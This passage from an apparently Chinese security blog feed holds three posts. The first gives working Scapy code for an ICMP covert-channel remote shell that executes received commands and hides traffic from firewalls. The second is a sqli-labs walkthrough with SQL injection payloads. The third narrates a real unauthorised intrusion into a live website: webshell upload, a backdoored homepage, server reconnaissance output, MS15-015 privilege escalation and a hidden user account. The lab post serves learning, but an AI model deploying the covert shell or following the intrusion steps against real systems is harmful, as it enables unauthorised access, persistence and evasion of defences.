src="https://s2.ax1x.com/2019/03/03/kqhYr9.png" alt="kqhYr9.png"></p><p>由于Padding头最多带的数据好像是1084byte，所以发送数据的时候要进行分段</p><p>为了确保不被防火墙或WAF拦截数据，对传输的数据进行base64编码<br>例子：<br>server</p><pre><code>from scapy.all import *import base64class demo:    def __init__(self,eth,dst,src):        self.eth=eth        self.dst=dst        self.src=src    def server(self,data):        a= IP(ttl=10, dst=self.dst, src=self.src) / ICMP(type=&quot;echo-request&quot;) / Padding(load=&#39;{}&#39;.format(data))        send(a,count=1)if __name__ == &#39;__main__&#39;:    d=demo(eth=&#39;Realtek RTL8188EU Wireless LAN 802.11n USB 2.0 Network Adapter&#39;,src=&#39;127.0.0.1&#39;,dst=&#39;192.168.3.75&#39;)    bm=bytes.decode(base64.b64encode(b&#39;demo&#39;))    d.server(data=bm)</code></pre><p>client</p><pre><code>from scapy.all import *import base64class demo:    def __init__(self,eth,dst,src):        self.eth=eth        self.dst=dst        self.src=src    def client(self):        jieshou = sniff(iface=self.eth, filter=&#39;icmp&#39;, count=1, timeout=99999)        paddings = jieshou[0][&#39;Padding&#39;]        jg = str(paddings).lstrip(&quot;b&#39;&quot;[0]).replace(&quot;&#39;&quot;, &#39;&#39;)        if jg != &#39;&#39;:            print(bytes.decode(base64.b64decode(jg)))if __name__ == &#39;__main__&#39;:    d=demo(eth=&#39;Realtek RTL8188EU Wireless LAN 802.11n USB 2.0 Network Adapter&#39;,src=&#39;127.0.0.1&#39;,dst=&#39;192.168.3.75&#39;)    d.client()</code></pre><p><img src="https://s2.ax1x.com/2019/03/03/kqIyMF.png" alt=""></p><p>命令交互：<br>方法：<br>1.发送命令被控端接受命令<br>2.被控端接受了命令并将base64解码执行完成后<br>3.通过逐步读取然后base64编码发送，最后发送执行命令后的长度<br>4.服务端接受返回结果base64解码输出，如果接收到最后的长度就代表接收的数据是完整的</p><p>例子：<br>server:</p><pre><code>from scapy.all import *import base64class demo:    def __init__(self,eth,dst,src):        self.eth=eth        self.dst=dst        self.src=src    def server(self,data):        a= IP(ttl=10, dst=self.dst, src=self.src) / ICMP(type=&quot;echo-request&quot;) / Padding(load=&#39;{}&#39;.format(data))        send(a,count=1)        self.js()    def js(self):        while True:            jieshou = sniff(iface=self.eth, filter=&#39;icmp&#39;, count=1, timeout=99999)            paddings = jieshou[0][&#39;Padding&#39;]            jg = str(paddings).lstrip(&quot;b&#39;&quot;[0]).replace(&quot;&#39;&quot;, &#39;&#39;)            try:                if jg != &#39;&#39;:                    print(bytes.decode(base64.b64decode(jg)))            except:                pass            if jg.isdigit()==True:                breakif __name__ == &#39;__main__&#39;:    d=demo(eth=&#39;Realtek RTL8188EU Wireless LAN 802.11n USB 2.0 Network Adapter&#39;,src=&#39;127.0.0.1&#39;,dst=&#39;192.168.3.75&#39;)    bm=bytes.decode(base64.b64encode(b&#39;whoami&#39;))    d.server(data=bm)</code></pre><p>client</p><pre><code>from scapy.all import *import base64import osclass demo:    def __init__(self,eth,dst,src):        self.eth=eth        self.dst=dst        self.src=src    def fs(self,data):        a= IP(ttl=10, dst=self.dst, src=self.src) / ICMP(type=&quot;echo-request&quot;) / Padding(load=&#39;{}&#39;.format(data))        send(a,count=1)    def client(self):        jieshou = sniff(iface=self.eth, filter=&#39;icmp&#39;, count=1, timeout=99999)        paddings = jieshou[0][&#39;Padding&#39;]        jg = str(paddings).lstrip(&quot;b&#39;&quot;[0]).replace(&quot;&#39;&quot;, &#39;&#39;)        if jg != &#39;&#39;:            zx=os.popen(bytes.decode(base64.b64decode(jg)))            q=0            for z in zx.readlines():                zb=bytes.decode(base64.b64encode(bytes(z,encoding=&#39;utf-8&#39;)))                self.fs(zb)                q+=int(len(zb))            self.fs(q)if __name__ == &#39;__main__&#39;:    d=demo(eth=&#39;Realtek RTL8188EU Wireless LAN 802.11n USB 2.0 Network Adapter&#39;,src=&#39;127.0.0.1&#39;,dst=&#39;192.168.3.75&#39;)    d.client()</code></pre><p><img src="https://s2.ax1x.com/2019/03/03/kqLLX6.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/03/03/kqLXnK.png" alt="kqLXnK.png"></p><p><img src="https://s2.ax1x.com/2019/03/03/kqLzAe.png" alt="kqLzAe.png"></p><p>还有一些其他功能，也差不多类似。仓库地址如下（各位可自己修改代码自己用）：<br><a href="https://github.com/422926799/python/tree/master/ICMP%E8%BF%9C%E6%8E%A7" target="_blank" rel="noopener">python/ICMP远控 at master · 422926799/python · GitHub</a></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sqli-labs Less 61 -&gt; sqli labs Less 65</title>
      <link href="/posts/2f16a4c2.html"/>
      <url>/posts/2f16a4c2.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><hr><p>把sqli-labs玩穿了，感觉学到的东西还是N多的。继续闯一下靶场<br><img src="http://n.sinaimg.cn/sinacn16/142/w1115h627/20181109/a4af-hnprhzw9116450.jpg" alt="a4af-hnprhzw9116450.jpg"></p><p><b>BGM :Lover Boy 88<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1343311848&auto=1&height=66"></iframe></b></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><hr><p><b>61关</b><br>代码如下：</p><pre><code class="php">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;Less-61:Challenge-8&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;div style =&quot;text-align:right&quot;&gt;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;input  type=&quot;submit&quot; name=&quot;reset&quot; value=&quot;Reset the Challenge!&quot; /&gt;&lt;/form&gt;&lt;/div&gt;&lt;/right&gt;&lt;div style=&quot; margin-top:20px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&lt;?php//including the Mysql connect parameters.include &#39;../sql-connections/sql-connect-1.php&#39;;include &#39;../sql-connections/functions.php&#39;;error_reporting(0);$pag = $_SERVER[&#39;PHP_SELF&#39;]; //generating page address to piggy back after redirects...$characters = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39;; //characterset for generating random data$times= 5;$table = table_name();$col = column_name(1);     // session id column name$col1 = column_name(2);   //secret key column name// Submitting the final answerif(!isset($_POST[&#39;answer_key&#39;])){    // resetting the challenge and repopulating the table .    if(isset($_POST[&#39;reset&#39;]))    {        setcookie(&#39;challenge&#39;, &#39; &#39;, time() - 3600000);        echo &quot;&lt;font size=4&gt;You have reset the Challenge&lt;/font&gt;&lt;br&gt;\n&quot;;        echo &quot;Redirecting you to main challenge page..........\n&quot;;        header( &quot;refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag&quot; );        //echo &quot;cookie expired&quot;;    }    else    {        // Checking the cookie on the page and populate the table with random value.        if(isset($_COOKIE[&#39;challenge&#39;]))        {            $sessid=$_COOKIE[&#39;challenge&#39;];            //echo &quot;Cookie value: &quot;.$sessid;        }        else        {            $expire = time()+60*60*24*30;            $hash = data($table,$col);            setcookie(&quot;challenge&quot;, $hash, $expire);        }        echo &quot;&lt;br&gt;\n&quot;;        // take the variables        if(isset($_GET[&#39;id&#39;]))        {            $id=$_GET[&#39;id&#39;];            //logging the connection parameters to a file for analysis.            $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);            fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);            fclose($fp);            //update the counter in database            next_tryy();            //Display attempts on screen.            $tryyy = view_attempts();            echo &quot;You have made : &quot;. $tryyy .&quot; of $times attempts&quot;;            echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;\n&quot;;            //Reset the Database if you exceed allowed attempts.            if($tryyy &gt;= ($times+1))            {                setcookie(&#39;challenge&#39;, &#39; &#39;, time() - 3600000);                echo &quot;&lt;font size=4&gt;You have exceeded maximum allowed attempts, Hence Challenge Has Been Reset &lt;/font&gt;&lt;br&gt;\n&quot;;                echo &quot;Redirecting you to challenge page..........\n&quot;;                header( &quot;refresh:3;url=../sql-connections/setup-db-challenge.php?id=$pag&quot; );                echo &quot;&lt;br&gt;\n&quot;;            }                // Querry DB to get the correct output            $sql=&quot;SELECT * FROM security.users WHERE id=((&#39;$id&#39;)) LIMIT 0,1&quot;;            $result=mysql_query($sql);            $row = mysql_fetch_array($result);            if($row)            {                echo &#39;&lt;font color= &quot;#00FFFF&quot;&gt;&#39;;                    $unames=array(&quot;Dumb&quot;,&quot;Angelina&quot;,&quot;Dummy&quot;,&quot;secure&quot;,&quot;stupid&quot;,&quot;superman&quot;,&quot;batman&quot;,&quot;admin&quot;,&quot;admin1&quot;,&quot;admin2&quot;,&quot;admin3&quot;,&quot;dhakkan&quot;,&quot;admin4&quot;);                $pass = array_reverse($unames);                echo &#39;Your Login name : &#39;. $unames[$row[&#39;id&#39;]];                echo &quot;&lt;br&gt;&quot;;                echo &#39;Your Password : &#39; .$pass[$row[&#39;id&#39;]];                echo &quot;&lt;/font&gt;&quot;;            }            else             {                echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;                print_r(mysql_error());                echo &quot;&lt;/font&gt;&quot;;              }        }        else        {            echo &quot;Please input the ID as parameter with numeric value as done in  Lab excercises\n&lt;br&gt;&lt;br&gt;\n&lt;/font&gt;&quot;;            echo &quot;&lt;font color=&#39;#00FFFF&#39;: size=3&gt;The objective of this challenge is to dump the &lt;b&gt;(secret key)&lt;/b&gt; from only random table from Database &lt;b&gt;&lt;i&gt;(&#39;CHALLENGES&#39;)&lt;/i&gt;&lt;/b&gt; in Less than $times attempts&lt;br&gt;&quot;;            echo &quot;For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.&lt;br&gt;&quot; ;        }    }?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;&lt;img src=&quot;../images/Less-61.jpg&quot; /&gt;&lt;/center&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;div  style=&quot; color:#00FFFF; font-size:18px; text-align:center&quot;&gt;&lt;form name=&quot;input&quot; action=&quot;&quot; method=&quot;post&quot;&gt;Submit Secret Key: &lt;input type=&quot;text&quot; name=&quot;key&quot;&gt;&lt;input type=&quot;submit&quot; name = &quot;answer_key&quot; value=&quot;Submit&quot;&gt;&lt;/form&gt; &lt;/div&gt;&lt;?php}else{    echo &#39;&lt;div  style=&quot; color:#00FFFF; font-size:18px; text-align:center&quot;&gt;&#39;;    $key = addslashes($_POST[&#39;key&#39;]);    $key = mysql_real_escape_string($key);    //echo $key;    //Query table to verify your result    $sql=&quot;SELECT 1 FROM $table WHERE $col1= &#39;$key&#39;&quot;;    //echo &quot;$sql&quot;;    $result=mysql_query($sql)or die(&quot;error in submittion of Key Solution&quot;.mysql_error());    $row = mysql_fetch_array($result);    if($row)    {        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;        echo &quot;\n&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;        echo &#39;&lt;img src=&quot;../images/Less-54-1.jpg&quot; /&gt;&#39;;        echo &quot;&lt;/font&gt;&quot;;         header( &quot;refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag&quot; );        }    else     {        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;        echo &quot;\n&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;        echo &#39;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&#39;;        header( &quot;refresh:3;url=index.php&quot; );        //print_r(mysql_error());        echo &quot;&lt;/font&gt;&quot;;              }    }?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>无法正确回显，但是输出了mysql报错。可以使用报错注入<br>payload：</p><pre><code>and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&quot;challenges&quot;),0x7e),1)and updatexml(1,concat(0x7e,((select group_concat(`2`) from (select 1,2,3,4 union select * from 表名)a)),0x7e),1)</code></pre><p><img src="https://s2.ax1x.com/2019/02/24/k4nWa6.md.png" alt="k4nWa6.md.png"></p><p><b>第62关</b><br>代码如下：</p><pre><code class="php">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;Less-62:Challenge-9&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;div style =&quot;text-align:right&quot;&gt;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;input  type=&quot;submit&quot; name=&quot;reset&quot; value=&quot;Reset the Challenge!&quot; /&gt;&lt;/form&gt;&lt;/div&gt;&lt;/right&gt;&lt;div style=&quot; margin-top:20px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&lt;?php//including the Mysql connect parameters.include &#39;../sql-connections/sql-connect-1.php&#39;;include &#39;../sql-connections/functions.php&#39;;error_reporting(0);$pag = $_SERVER[&#39;PHP_SELF&#39;]; //generating page address to piggy back after redirects...$characters = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39;; //characterset for generating random data$times= 130;$table = table_name();$col = column_name(1);     // session id column name$col1 = column_name(2);   //secret key column name// Submitting the final answerif(!isset($_POST[&#39;answer_key&#39;])){    // resetting the challenge and repopulating the table .    if(isset($_POST[&#39;reset&#39;]))    {        setcookie(&#39;challenge&#39;, &#39; &#39;, time() - 3600000);        echo &quot;&lt;font size=4&gt;You have reset the Challenge&lt;/font&gt;&lt;br&gt;\n&quot;;        echo &quot;Redirecting you to main challenge page..........\n&quot;;        header( &quot;refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag&quot; );        //echo &quot;cookie expired&quot;;    }    else    {        // Checking the cookie on the page and populate the table with random value.        if(isset($_COOKIE[&#39;challenge&#39;]))        {            $sessid=$_COOKIE[&#39;challenge&#39;];            //echo &quot;Cookie value: &quot;.$sessid;        }        else        {            $expire = time()+60*60*24*30;            $hash = data($table,$col);            setcookie(&quot;challenge&quot;, $hash, $expire);        }        echo &quot;&lt;br&gt;\n&quot;;        // take the variables        if(isset($_GET[&#39;id&#39;]))        {            $id=$_GET[&#39;id&#39;];            //logging the connection parameters to a file for analysis.            $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);            fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);            fclose($fp);            //update the counter in database            next_tryy();            //Display attempts on screen.            $tryyy = view_attempts();            echo &quot;You have made : &quot;. $tryyy .&quot; of $times attempts&quot;;            echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;\n&quot;;            //Reset the Database if you exceed allowed attempts.            if($tryyy &gt;= ($times+1))            {                setcookie(&#39;challenge&#39;, &#39; &#39;, time() - 3600000);                echo &quot;&lt;font size=4&gt;You have exceeded maximum allowed attempts, Hence Challenge Has Been Reset &lt;/font&gt;&lt;br&gt;\n&quot;;                echo &quot;Redirecting you to challenge page..........\n&quot;;                header( &quot;refresh:3;url=../sql-connections/setup-db-challenge.php?id=$pag&quot; );                echo &quot;&lt;br&gt;\n&quot;;            }                // Querry DB to get the correct output            $sql=&quot;SELECT * FROM security.users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;            $result=mysql_query($sql);            $row = mysql_fetch_array($result);            if($row)            {                echo &#39;&lt;font color= &quot;#00FFFF&quot;&gt;&#39;;                    $unames=array(&quot;Dumb&quot;,&quot;Angelina&quot;,&quot;Dummy&quot;,&quot;secure&quot;,&quot;stupid&quot;,&quot;superman&quot;,&quot;batman&quot;,&quot;admin&quot;,&quot;admin1&quot;,&quot;admin2&quot;,&quot;admin3&quot;,&quot;dhakkan&quot;,&quot;admin4&quot;);                $pass = array_reverse($unames);                echo &#39;Your Login name : &#39;. $unames[$row[&#39;id&#39;]];                echo &quot;&lt;br&gt;&quot;;                echo &#39;Your Password : &#39; .$pass[$row[&#39;id&#39;]];                echo &quot;&lt;/font&gt;&quot;;            }            else             {                echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;//                print_r(mysql_error());                echo &quot;&lt;/font&gt;&quot;;              }        }        else        {            echo &quot;Please input the ID as parameter with numeric value as done in  Lab excercises\n&lt;br&gt;&lt;br&gt;\n&lt;/font&gt;&quot;;            echo &quot;&lt;font color=&#39;#00FFFF&#39;: size=3&gt;The objective of this challenge is to dump the &lt;b&gt;(secret key)&lt;/b&gt; from only random table from Database &lt;b&gt;&lt;i&gt;(&#39;CHALLENGES&#39;)&lt;/i&gt;&lt;/b&gt; in Less than $times attempts&lt;br&gt;&quot;;            echo &quot;For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.&lt;br&gt;&quot; ;        }    }?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;&lt;img src=&quot;../images/Less-62.jpg&quot; /&gt;&lt;/center&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;div  style=&quot; color:#00FFFF; font-size:18px; text-align:center&quot;&gt;&lt;form name=&quot;input&quot; action=&quot;&quot; method=&quot;post&quot;&gt;Submit Secret Key: &lt;input type=&quot;text&quot; name=&quot;key&quot;&gt;&lt;input type=&quot;submit&quot; name = &quot;answer_key&quot; value=&quot;Submit&quot;&gt;&lt;/form&gt; &lt;/div&gt;&lt;?php}else{    echo &#39;&lt;div  style=&quot; color:#00FFFF; font-size:18px; text-align:center&quot;&gt;&#39;;    $key = addslashes($_POST[&#39;key&#39;]);    $key = mysql_real_escape_string($key);    //echo $key;    //Query table to verify your result    $sql=&quot;SELECT 1 FROM $table WHERE $col1= &#39;$key&#39;&quot;;    //echo &quot;$sql&quot;;    $result=mysql_query($sql)or die(&quot;error in submittion of Key Solution&quot;.mysql_error());    $row = mysql_fetch_array($result);    if($row)    {        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;        echo &quot;\n&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;        echo &#39;&lt;img src=&quot;../images/Less-54-1.jpg&quot; /&gt;&#39;;        echo &quot;&lt;/font&gt;&quot;;        header( &quot;refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag&quot; );         }    else     {        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;        echo &quot;\n&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;        echo &#39;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&#39;;        header( &quot;refresh:3;url=index.php&quot; );        //print_r(mysql_error());        echo &quot;&lt;/font&gt;&quot;;              }    }?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>闭合方式变了，不输出mysql报错，无法报错注入，只能盲注了</p><pre><code>and(length(database())=10)</code></pre><p><img src="https://s2.ax1x.com/2019/02/24/k4ukd0.png" alt="k4ukd0.png"></p><p>payload如下：</p><pre><code>http://127.0.0.1/sqli-labs-master/Less-62/?id=1%27)%20and(1=(select%20count(table_name)%20from%20information_schema.tables%20where%20table_schema=%22challenges%22))%20--+http://127.0.0.1/sqli-labs-master/Less-62/?id=1%27)%20and(ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=%22challenges%22%20limit%200,1),10,1)))%20--+然后跑表名，然后跑列名：http://127.0.0.1/sqli-labs-master/Less-62/?id=1%27)%20and(ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=%22challenges%22%20limit%200,1),1,1))=104)%20--+http://127.0.0.1/sqli-labs-master/Less-62/?id=1%27)%20and(ascii(substr((select%20column_name%20from%20information_schema.columns%20where%20table_name=%22hjvgjkpvnm%22%20limit%200,1),1,1)))--+略过...........</code></pre><p>第63关-65关都是盲注…,这里就不重复了</p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Write a privilege</title>
      <link href="/posts/88e0ff63.html"/>
      <url>/posts/88e0ff63.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>今天和某位基友交流然后谈了一些东西后，日了某黄网 。拿到shell后原本想就这样吧，但是后面想练习提权。<br><img src="https://p4.ssl.cdn.btime.com/t01cfe6fae2c55f39f2.jpg?size=900x600" alt="t01cfe6fae2c55f39f2.jpg?size=900x600"></p><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>通过任意文件上传得到webshell<br><img src="https://s2.ax1x.com/2019/02/23/khOPbt.png" alt="khOPbt.png"></p><p>但是这个webshell并不是很好用，通过webshell下载黄网的主页在里面添加后门。然后连接到菜刀<br><img src="https://s2.ax1x.com/2019/02/23/khvSv4.png" alt="khvSv4.png"></p><p>查看权限<br><img src="https://s2.ax1x.com/2019/02/23/khOlV0.png" alt="khOlV0.png"></p><p>进行一系列信息收集</p><pre><code>ipconfignetstat -anotasklist /svcsysteminfonet localgroupnet user</code></pre><p>将目标打的补丁贴到这里：<a href="https://bugs.hacking8.com" target="_blank" rel="noopener">提权辅助网页</a><br>发现存在MS15-015提权<br><img src="https://s2.ax1x.com/2019/02/23/khO2Md.png" alt="khO2Md.png"></p><p>信息如下：</p><pre><code>权限：iis apppool\ugwyahx.com用户：Administrator            Guest     打了的补丁：主机名:           WIN-KSQJUD5F488OS 名称:          Microsoft Windows Server 2012 R2 StandardOS 版本:          6.3.9600 暂缺 Build 9600OS 制造商:        Microsoft CorporationOS 配置:          独立服务器OS 构件类型:      Multiprocessor Free注册的所有人:     Windows 用户注册的组织:       产品 ID:          00252-70000-00000-AA535初始安装日期:     2018/9/15, 10:57:30系统启动时间:     2018/9/16, 21:33:38系统制造商:       Supermicro系统型号:         SYS-5038ML-H8TRF系统类型:         x64-based PC处理器:           安装了 1 个处理器。                  [01]: Intel64 Family 6 Model 60 Stepping 3 GenuineIntel ~800 MhzBIOS 版本:        American Megatrends Inc. 3.0a, 2015/12/17Windows 目录:     C:\Windows系统目录:         C:\Windows\system32启动设备:         \Device\HarddiskVolume1系统区域设置:     zh-cn;中文(中国)输入法区域设置:   zh-cn;中文(中国)时区:             (UTC+08:00)北京，重庆，香港特别行政区，乌鲁木齐物理内存总量:     8,151 MB可用的物理内存:   6,763 MB虚拟内存: 最大值: 10,071 MB虚拟内存: 可用:   8,550 MB虚拟内存: 使用中: 1,521 MB页面文件位置:     C:\pagefile.sys域:               WORKGROUP登录服务器:       暂缺修补程序:         安装了 3 个修补程序。                  [01]: KB2883200                  [02]: KB2894029                  [03]: KB2894179网卡:             安装了 2 个 NIC。                  [01]: Intel(R) I350 千兆网络连接                      连接名:      以太网                      状态:        媒体连接已中断                  [02]: Intel(R) I350 千兆网络连接                      连接名:      以太网 2                      启用 DHCP:   否                      IP 地址                        [01]: xxx.xxx.xxx.xx                        [02]: xxx.xxx.xxx.xx                        [03]: xxx.xxx.xxx.xx                        [04]: xxx.xxx.xxx.xx                        [05]: fe80::a0f8:34f0:c917:156aHyper-V 要求:     虚拟机监视器模式扩展: 是                  固件中已启用虚拟化: 是                  二级地址转换: 是                  数据执行保护可用: 是运行的进程：映像名称                       PID 服务                                        ========================= ======== ============================================System Idle Process              0 暂缺                                        System                           4 暂缺                                        smss.exe                       280 暂缺                                        csrss.exe                      388 暂缺                                        csrss.exe                      444 暂缺                                        wininit.exe                    452 暂缺                                        winlogon.exe                   504 暂缺                                        services.exe                   536 暂缺                                        lsass.exe                      544 SamSs                                       svchost.exe                    608 BrokerInfrastructure, DcomLaunch, LSM,                                         PlugPlay, Power, SystemEventsBroker         svchost.exe                    660 RpcEptMapper, RpcSs                         LogonUI.exe                    736 暂缺                                        dwm.exe                        744 暂缺                                        svchost.exe                    760 Dhcp, EventLog, lmhosts, Wcmsvc             svchost.exe                    804 Appinfo, AppMgmt, BITS, CertPropSvc, gpsvc,                                    IKEEXT, iphlpsvc, LanmanServer, ProfSvc,                                       Schedule, SENS, SessionEnv,                                                    ShellHWDetection, Themes, Winmgmt           svchost.exe                    828 EventSystem, FontCache, netprofm, nsi       svchost.exe                    904 CryptSvc, Dnscache, LanmanWorkstation,                                         NlaSvc, WinRM                               svchost.exe                    308 BFE, DPS, MpsSvc                            spoolsv.exe                   1032 Spooler                                     svchost.exe                   1056 AppHostSvc                                  svchost.exe                   1088 PolicyAgent                                 svchost.exe                   1116 Netman, TrkWks, UALSVC, UmRdpService        svchost.exe                   1132 W3SVC, WAS                                  svchost.exe                   1580 TermService                                 ChsIME.exe                    1984 暂缺                                        msdtc.exe                     1540 MSDTC                                       csrss.exe                      144 暂缺                                        winlogon.exe                  1956 暂缺                                        dwm.exe                       1304 暂缺                                        taskhostex.exe                2164 暂缺                                        rdpclip.exe                   2268 暂缺                                        ChsIME.exe                    2324 暂缺                                        explorer.exe                  2392 暂缺                                        DUMeterSvc.exe                3400 DUMeterSvc                                  DUMeter.exe                   3212 暂缺                                        phpStudy.exe                  3312 暂缺                                        mysqld.exe                    1548 MySQLa                                      notepad.exe                   3452 暂缺                                        mspaint.exe                   5068 暂缺                                        w3wp.exe                      4712 暂缺                                        w3wp.exe                      2788 暂缺                                        w3wp.exe                      2000 暂缺                                        w3wp.exe                      2344 暂缺                                        w3wp.exe                      4560 暂缺                                        w3wp.exe                      4556 暂缺                                        cmd.exe                       3444 暂缺                                        conhost.exe                   4888 暂缺                                        test.exe                      4356 暂缺                                        cmd.exe                       4600 暂缺                                        conhost.exe                   3620 暂缺                                        test.exe                      3648 暂缺                                        csrss.exe                     3160 暂缺                                        winlogon.exe                  2828 暂缺                                        dwm.exe                       2028 暂缺                                        rdpclip.exe                   4316 暂缺                                        taskhostex.exe                1664 暂缺                                        ChsIME.exe                    2612 暂缺                                        explorer.exe                  2476 暂缺                                        wlrmdr.exe                    4160 暂缺                                        php-cgi.exe                   5084 暂缺                                        php-cgi.exe                   4708 暂缺                                        php-cgi.exe                   3788 暂缺                                        WmiPrvSE.exe                  4980 暂缺                                        WmiPrvSE.exe                  4756 暂缺                                        TrustedInstaller.exe          3188 TrustedInstaller                            TiWorker.exe                  4988 暂缺                                        cmd.exe                       2400 暂缺                                        conhost.exe                   3008 暂缺                                        cmd.exe                       5096 暂缺                                        tasklist.exe                  3652 暂缺         开启的端口：活动连接  协议  本地地址          外部地址        状态           PID  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       660  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       1548  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4  TCP    0.0.0.0:8980           0.0.0.0:0              LISTENING       4  TCP    0.0.0.0:25341          0.0.0.0:0              LISTENING       1580  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       452  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       760  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       804  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       1032  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       1088  TCP    0.0.0.0:49158          0.0.0.0:0              LISTENING       536  TCP    0.0.0.0:49159          0.0.0.0:0              LISTENING       544  TCP    xxx.xxx.xxx.xx     0.0.0.0:0              LISTENING       4</code></pre><p>上payload，然后提权添加隐藏用户<br><img src="https://s2.ax1x.com/2019/02/23/khXznA.png" alt="khXznA.png"></p><p><img src="https://s2.ax1x.com/2019/02/23/khvTJK.md.png" alt="khvTJK.md.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CVE-2018-20250 recurrence</title>
      <link href="/posts/96130294.html"/>
      <url>/posts/96130294.html</url>
